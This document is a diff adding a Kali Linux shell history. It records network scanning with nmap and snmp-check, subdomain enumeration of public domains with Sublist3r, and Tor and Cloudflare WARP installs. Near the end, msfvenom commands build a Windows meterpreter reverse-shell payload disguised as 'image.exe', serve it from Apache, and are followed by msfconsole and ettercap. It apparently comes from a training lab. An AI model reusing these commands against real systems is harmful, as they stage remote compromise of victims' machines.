@@ -1,0 +1,341 @@
+─(user㉿user)-[~]
+└─$ history
+    1  sudo su
+    2  exit
+    3  sudo su
+    4  exit
+    5  init 0
+    6  sudo su
+    7  ls
+    8  sudo si
+    9  clear
+   10  sudo su
+   11  exit
+   12  sudo su
+   13  sudo su 
+   14  init 0
+   15  nmap -sn 192.168.145.2
+   16  sudo nmap -sn 192.168.145.2
+   17  sudo nmap -sn -V -p 192.168.145.2
+   18  sudo nmap -sn -VA -p 192.168.145.2
+   19  sudo nmap -sn -p 192.168.145.2
+   20  sudo nmap -sn -f -p 192.168.145.2
+   21  sudo nmap - 192.168.145.2
+   22  ping  192.168.145.2
+   23  sudo nmap -sn -p- 22  scrit=ssh* 192.168.145.2
+   24  sudo nmap -sn -p- 22  script=ssh* 192.168.145.2
+   25  sudo nmap -sn -p- 22  --script=ssh* 192.168.145.2
+   26  sudo nmap -sn -p- 22   192.168.145.2
+   27  sudo nmap -sn -p  22  --script=ssh* 192.168.145.2
+   28  sudo nmap -sn -p 22 ssh 192.168.145.2
+   29  sudo nmap -sn -p 22 192.168.145.2
+   30  sudo nmap -p 22 192.168.145.2
+   31  sudo nmap -p 80  192.168.145.2
+   32  sudo nmap -p 137  192.168.145.2
+   33  sudo nmap 192.168.145.2
+   34  ip s
+   35  ip a
+   36  ping  192.168.145.2
+   37  clear
+   38  sudo su
+   39  exit
+   40  init 0
+   41  sudo su
+   42  sudo su
+   43  ip a
+                                                                                                                                                                                                                  
+┌──(user㉿user)-[~]
+└─$ sudo su
+[sudo] password for user: 
+┌──(root㉿user)-[/home/user]
+└─# history
+    1  init 0
+    2  clear
+    3  cd /var/log
+    4  ls
+    5  exit
+    6  clear
+    7  apt-get updatel; 
+    8  apt-get updatel; apt-get upgrade -y
+    9  apt-get update; apt-get upgrade -y
+   10  cler
+   11  clear
+   12  exit
+   13  apt-get update; apt-get upgrade -y
+   14  clear
+   15  init
+   16  init 0
+   17  ls
+   18  apt get update
+   19  apt-get update; apt-get upgrade -y
+   20  <script src="https://gist.github.com/CodyKochmann/3dd6c169da84020ca0a94f350a352315.js"></script>
+   21  wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -\nsudo apt install -y apt-transport-https\necho "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list\nsudo apt update\nsudo apt install -y sublime-text
+   22  git clone https://github.com/aboul3la/Sublist3r.git
+   23  sudo pip install -r requirements.txt
+   24  ls
+   25  rm -rf Sublist3r
+   26  ls
+   27  cd /
+   28  ls
+   29  cd home
+   30  ls
+   31  cd user
+   32  ls
+   33  git clone https://github.com/aboul3la/Sublist3r.git
+   34  sudo pip install -r requirements.txt
+   35  sudo apt-get install python-requests
+   36  wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -\nsudo apt install -y apt-transport-https\necho "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list\nsudo apt update\nsudo apt install -y sublime-text
+   37  sudo pip install requests
+   38  ls
+   39  cd Sublist3r
+   40  ls
+   41  └─# sudo pip install -r requirements.txt\n
+   42  sudo pip install -r requirements.txt\n
+   43  clear
+   44  tor
+   45  clear
+   46  apt-get install Tor -t
+   47  apt-get install Tor -y
+   48  apt-get install tor -y
+   49  tor
+   50  clear
+   51  init 0
+   52  ls
+   53  cd s
+   54  cd Sublist3r
+   55  ls
+   56  python sublist3r.py
+   57  python sublist3r.py -d rekuten.com
+   58  ls
+   59  sudo pip install -r requirements.txt
+   60  sudo pip install requests
+   61  sudo pip install dnspython
+   62  python sublist3r.py -d rekuten.com -p 80,443
+   63  cd
+   64  cd /s
+   65  cd /
+   66  curl -fsSl https://pkg.cloudflareclient.com/cloudflare-warp-ascii.repo | sudo tee /etc/yum.repos.d/cloudflare-warp.repo
+   67  sudo yum update
+   68  sudo yum install cloudflare-warp
+   69  apt-get  install cloudflare-warp
+   70  apt-get update cloudflare-warp
+   71  apt-get cloudflare-warp update
+   72  cd /etc/yum.repos.d/cloudflare-warp.repo
+   73  cd etc/yum.repos.d/cloudflare-warp.repo
+   74  ls
+   75  cd etc
+   76  ls
+   77  cd /yum
+   78  curl -fsSl https://pkg.cloudflareclient.com/cloudflare-warp-ascii.repo | sudo tee /etc/yum.repos.d/cloudflare-warp.repo
+   79  curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg
+   80  cd
+   81  cd /
+   82  cd etc
+   83  curl -fsSl https://pkg.cloudflareclient.com/cloudflare-warp-ascii.repo
+   84  apt-get cloudflare-warp
+   85  apt-get install cloudflare-warp
+   86  apt-get update && sudo apt-get install cloudflare-warp
+   87  curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+   88  echo "deb [signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+   89  apt-get update && sudo apt-get install cloudflare-warp
+   90  ls
+   91  systemctl cloudflare-ware status
+   92  ls
+   93  cd cloud
+   94  ls
+   95  cd cloud.cfg.d
+   96  ls
+   97  cd ..
+   98  ls
+   99  sudo apt-get update && sudo apt-get install cloudflare-warp
+  100  sudo apt-get update && sudo apt-get install cloudflare-warp --version 8.0
+  101  sudo apt-get update && sudo apt-get install cloudflare-warp --version 8
+  102  /etc/apt/trusted.gpg
+  103  cd /apt/trusted.gpg
+  104  ls
+  105  cd ..
+  106  ls
+  107  cd etc
+  108  curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+  109  echo "deb [signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+  110  sudo apt-get update && sudo apt-get install cloudflare-warp
+  111  apt-key(8)
+  112  apt-key (8)
+  113  ls
+  114  cd ..
+  115  l
+  116  ls
+  117  grep cloudflare-ware
+  118  cd ..
+  119  ls
+  120  cd
+  121  ls
+  122  python sublist3r.py -d yahoo.com
+  123  cd Sublist3r
+  124  python sublist3r.py -d yahoo.com
+  125  python sublist3r.py -d yahoo.com -p 80,443,8080
+  126  python sublist3r.py -d yahoo.com -p 80,443
+  127  python sublist3r.py -d yahoo.com -p 443
+  128  systemctl cloudflare-ware restart
+  129  cd ..
+  130  cd /
+  131  ls
+  132  cd usr
+  133  cd share
+  134  ls
+  135  cd keyings
+  136  ls
+  137  cd keyrings
+  138  ld
+  139  ls
+  140  cd ../../..
+  141  ls
+  142  cd
+  143  ls
+  144  mv Sublist3r /
+  145  ls
+  146  cd /
+  147  ls
+  148  curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+  149  echo "deb [signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+  150  sudo apt-get update && sudo apt-get install cloudflare-warp
+  151  curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+  152  echo "deb [signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+  153  sudo apt-get update && sudo apt-get install cloudflare-warp
+  154  systemctl cloudflare-warp status
+  155  systemctl status cloudflare-warp 
+  156  ls
+  157  systemctl status cloudflare-warp.service
+  158  systemctl  cloudflare-warp service 
+  159  ls
+  160  grep cloudflare-warp
+  161  grep cloudflare-warp .*
+  162  grep cloudflare-warp /*
+  163  grep cloudflare-warp *
+  164  grep cloudflare-warp 
+  165  warp-cli register
+  166  ls
+  167  systemctl warp status
+  168  systemctl warp start
+  169  apt-get update
+  170  apt-get upgrade
+  171  exit
+  172  clear
+  173  wireshark
+  174  cls
+  175  clea
+  176  clear
+  177  alias cls = clear
+  178  cls
+  179  clear
+  180  alias clear = c
+  181  clear
+  182  ping 192.168.179.1 
+  183  clear
+  184  nmap 192.168.179.1
+  185  nmap -sU -p 192.168.179.1
+  186  nmap -sU -p 161 192.168.179.1
+  187  nmap 192.168.145.138
+  188  clear
+  189  nmap -sU -p 161 192.168.179.1
+  190  clear
+  191  nmap tarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 05:35 EDT\nError #487: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"\nQUITTING!
+  192  clear
+  193  nmap 192.168.145.2
+  194  cls
+  195  clear
+  196  nmap 192.168.145.153
+  197  nmap -sU -p 161 192.168.145.153
+  198  nmap -sU -p 135 192.168.145.153
+  199  clear
+  200  nmap 192.168.145.153
+  201  nmap -sU -p 161 192.168.145.153
+  202  clear
+  203  nmap 172
+  204  clear
+  205  nmap 172.16.0.2
+  206  nmap -sU -p 161 172.16.0.2
+  207  cleat
+  208  clear
+  209  nmap -sV 172.16.0.2
+  210  clear
+  211  nmap -sU -p 161 172.16.0.2
+  212  clear
+  213  nmap -sU -p 161 172.16.0.2
+  214  snmp-check 172.16.0.2
+  215  ifconfig
+  216  snmp-check 192.168.145.138|more
+  217  nmap -sU -p 161 192.168.145.153
+  218  init 0
+  219  clear
+  220  ipconfig
+  221  cls
+  222  clear
+  223  if
+  224  clear
+  225  ifconfig
+  226  nmap 192.168.145.153
+  227  nmap -sU -p 161 192.168.145.153
+  228  snmp-check 192.168.145.153
+  229  clear
+  230  exit
+  231  clear
+  232  msfvenom -p window/meterpreter/reverse_tcp lport=kali port ip lport = 9999 -f exe -o /var/www/html/image.exe
+  233  clear
+  234  exit
+  235  clear
+  236  cd /var/www/html
+  237  ls
+  238  ifconfig
+  239  clear
+  240  ls
+  241  cp image.exe
+  242  cp image.exe /usr
+  243  cd usr
+  244  clear
+  245  ifconfig
+  246  msfvenom -p window/meterpreter/reverse_tcp lhost=192.168.145.138 lport = 8795 -f exe -o /var/www/html/image.exe
+  247  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.145.138 lport = 8795 -f exe -o /var/www/html/image.exe
+  248  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.145.138 lport = 4444 -f exe -o /var/www/html/image.exe
+  249  cd /var/www/html
+  250  ls
+  251  clear
+  252  msfvenom -p windows/meterpreter/reverse_tcp lhost = 192.168.145.138 lport = 4444 -f exe -p /var/www/html/image.exe
+  253  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.145.138 lport=4444 -f exe -o /var/www/html/image.exe
+  254  clear
+  255  service apache2 restart
+  256  msfconsole
+  257  exit
+  258  ip a
+  259  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.145.138 lport=4444 -f exe -o /var/www/html/image.exe
+  260  cd /var/www/html
+  261  ls
+  262  vi image.exe
+  263  clear
+  264  service apache2 restart
+  265  ifcongif
+  266  clear
+  267  ifconfig
+  268  cd /var/www/html
+  269  ls
+  270  rm -rf image.exe
+  271  ls
+  272  rm -rf index.html
+  273  rm - index.nginx-debian.html
+  274  clear
+  275  ls
+  276  touch home.html
+  277  ls
+  278  vi home.html
+  279  ls
+  280  service apache2 restart
+  281  ls
+  282  exit
+  283  service apache2 restart
+  284  msfconsole
+  285  service apache2 restart
+  286  ls /var/www/html
+  287  ls /var/www/html/
+  288  init 0
+  289  ettercap -G
+
